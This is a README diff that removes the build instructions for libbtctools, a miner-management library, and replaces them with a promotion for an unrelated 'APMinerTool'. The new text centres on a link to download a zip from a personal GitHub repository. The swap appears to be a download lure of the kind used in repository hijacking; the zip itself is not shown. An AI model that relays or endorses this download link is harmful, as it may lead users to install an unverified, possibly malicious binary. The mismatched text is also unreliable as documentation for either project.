@@ -1,152 +1,47 @@
-A core library of BTCTools
-==================
+# APMinerTool [1.0.11]: Download, Setup and How to Use
+==========================================================
 
-`libbtctools` is a library of `BTCTools`, it provides the basic ability of scanning, configuration and rebooting some miners.
+APMinerTool - is a mining farm monitoring software that can scan multiple LAN IP segments at the same time and can monitor ASIC operation status in batch. The software supports alert settings, IP ranges, firmware, etc.
 
-It can build on Windows, Linux and macOS, as dynamic or static library.
+[Download APMinerTool-1.0.11.zip for Windows/Linux](https://github.com/EddieLise/APMinerTool)
 
-# Dependency
-There are 4 dependencies:
-* Boost 1.59 or later (1.65 or later is validated and recommended)
-* OpenSSL (both 1.0 or 1.1 are OK)
-* Lua-5.1 or LuaJIT-2.0 (LuaJIT is recommended but incompatibly with macOS)
-* Crypto++ (5.6.5 or later)
-And `libpthread` is required on Linux and macOS.
+## Features
++ Batch monitoring of the state of the ASIC.
++ Mass configuration of devices (in batches).
++ Firmware update (in batches).
++ Batch restart.
++ Supports simultaneous scanning of multiple IP segment miners on the local network.
 
-# Build on Linux
-Example on Ubuntu 18.04 x64:
-```bash
-# build tools
-apt-get install -y build-essential autotools-dev libtool autoconf automake pkg-config cmake gcc g++
+# How to setup APMinerTool
 
-# install boost via apt
-apt install libboost-all-dev
+## Step 1 - Download the program
+## Step 2 - Run IP Scanner
+First thing you need to do is find the IP of your ASIC. This can be done in this program, or you can use a lighter utility - IP Reporter.
 
-# or build boost 1.65 if you want (optional)
-wget https://dl.bintray.com/boostorg/release/1.65.1/source/boost_1_65_1.tar.gz
-tar zxf boost_1_65_1.tar.gz
-cd boost_1_65_1
-./bootstrap.sh
-./b2
-./b2 install
+Click "Start Scan" and then press and hold the "IP report" button on each ASIC for 3-5 seconds to start adding devices.
 
-# install other dependencies
-apt update
-apt install libssl-dev libluajit-5.1-dev libcrypto++-dev
+After you connected the device to the network and power supply, the IP obtained during the device setup is in DHCP mode and the IP address is not fixed. If you have many devices, you can set fixed IP addresses in batch mode for easy management.
 
-# clone and build
-git clone https://github.com/btccom/libbtctools.git
-cd libbtctools
-mkdir build
-cd build
+Example: the router assigns a mode DHCP: 101-254. Just click the "start scan" button.
 
-# build as static library
-cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=STATIC ..
-make
-make install
+The scan will take about 30 seconds. When it is complete, a window should appear informing you that the process is complete:
+![image](https://user-images.githubusercontent.com/98889829/212470470-f1fc3d6f-5b87-4fab-bbcb-081c2577734a.png)
 
-# or build as dynamic library
-cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=SHARED ..
-make
-make install
+The utility will display information about what it found.
+![image](https://user-images.githubusercontent.com/98889829/212470482-cd33e6ae-c467-457c-a69a-9ecb23a55ad2.png)
 
-# running demos
-cd /opt/btctools/bin/btctools
-./ipGeneratorDemo
-./scanMinerDemo
-./configMinerDemo
-./rebootMinerDemo
-```
+Enter the static IP address you want to set for the miner in the next fill IP field:
+![image](https://user-images.githubusercontent.com/98889829/212470487-2a2abfbe-5c26-47c3-9159-01f0f2b58071.png)
 
-# Build on macOS
-It seems like build on Linux. Search and install dependencies with `brew` first.
+## Step 3 - Configure the utility
+Enter the pool address and password in batch mode in the "Pool Configuration" section.
+![image](https://user-images.githubusercontent.com/98889829/212470492-bfac841d-7908-49e0-863f-b6e792dceaa2.png)
 
-Tips: install `lua-5.1` instead of `luajit-2.0`. The demo will segmentation fault with `luajit-2.0` and I don't know the reason.
+In the "Worker" field, select the name of the worker (for tracking statistics. The name can be anything. For example, "Antminer"). In the field on the right, select the type of coin to be mined.
+![image](https://user-images.githubusercontent.com/98889829/212470508-f2bf0bcf-29b3-4b5f-bce4-2fb6e9075fc3.png)
 
-The command will be:
-```bash
-brew install cmake boost openssl lua@5.1 cryptopp
+Check out the list of available devices. The important part here is that you can see which devices are out of order due to the high temperature.
+![image](https://user-images.githubusercontent.com/98889829/212470511-0ec47c91-2fb3-43cc-b48b-badbbeeec274.png)
 
-# static library
-cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=STATIC -DBTCTOOLS__LUA_TYPE=NORMAL ..
-
-# or dynamic library
-cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=SHARED -DBTCTOOLS__LUA_TYPE=NORMAL ..
-
-# build & install
-make
-make install
-```
-
-# Build on Windows
-
-### Install Visual Studio
-
-Please install the C/C++ Development Kit with Visual Studio.
-
-See https://visualstudio.microsoft.com/ for more details.
-
-### Install CMake
-
-See https://cmake.org/download/ for more details.
-
-### Install vcpkg
-
-See https://github.com/Microsoft/vcpkg/ for more details.
-
-
-Quick Steps:
-```
-git clone https://github.com/Microsoft/vcpkg.git
-cd vcpkg
-.\bootstrap-vcpkg.bat
-.\vcpkg integrate install
-```
-
-Example output for `.\vcpkg integrate install`:
-
-> PS G:\work\vcpkg> .\vcpkg integrate install
-> Applied user-wide integration for this vcpkg root.
-> 
-> All MSBuild C++ projects can now #include any installed libraries.
-> Linking will be handled automatically.
-> Installing new libraries will make them instantly available.
-> 
-> CMake projects should use: "-DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake"
-
-### install packages via vcpkg
-
-
-#### 32bit
-```
-.\vcpkg install boost:x86-windows-static openssl:x86-windows-static cryptopp:x86-windows-static luajit:x86-windows-static
-```
-
-#### 64bit
-```
-.\vcpkg install boost:x64-windows-static openssl:x64-windows-static cryptopp:x64-windows-static luajit:x64-windows-static
-```
-
-### cmake & build
-
-#### 32bit
-```
-md build.32
-cd build.32
-cmake -DCMAKE_BUILD_TYPE=Release -A win32 -DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x86-windows-static -DBTCTOOLS__STATIC_LINKING_VC_LIB=ON -DBTCTOOLS__LIB_TYPE=STATIC -DCMAKE_INSTALL_PREFIX=G:\work\lib32\btctools ..
-start libbtctools.sln
-```
-
-#### 64bit
-```
-md build.64
-cd build.64
-cmake -DCMAKE_BUILD_TYPE=Release -A x64 -DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x64-windows-static -DBTCTOOLS__STATIC_LINKING_VC_LIB=ON -DBTCTOOLS__LIB_TYPE=STATIC -DCMAKE_INSTALL_PREFIX=G:\work\lib64\btctools ..
-start libbtctools.sln
-```
-
-Replace `G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake` to your `vcpkg.cmake` path.
-
-Replace `G:\work\lib[32|64]\btctools` to the install path what you want.
-
-Select **Release** instead of the default **Debug** in the build type drop-down box, then build the **INSTALL** project to install.
+## Firmware
+You can find the original ASIC firmware on the Bitmain website: https://service.bitmain.com/support/download
